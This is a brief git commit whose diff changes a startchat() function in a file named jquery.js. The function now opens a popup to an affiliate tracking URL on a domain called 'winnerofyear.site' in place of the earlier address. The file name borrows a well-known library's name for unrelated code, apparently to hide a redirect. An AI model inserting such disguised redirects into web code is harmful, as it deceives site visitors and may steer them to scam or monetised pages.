78b829c01293409a35f288be1de5599013c9c8e8
MZmillionaire <mohamed.denr74@gmail.com>
2025-04-24 18:58:56 +0200

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,3 +1,3 @@
 function startchat() {
-    window.open('https://zbi.com',);
+    window.open('https://aff.winnerofyear.site/?utm_medium=e90493efd27e1f0d49814ba05389ca1c67d5da94&utm_campaign=EMR',);
 }
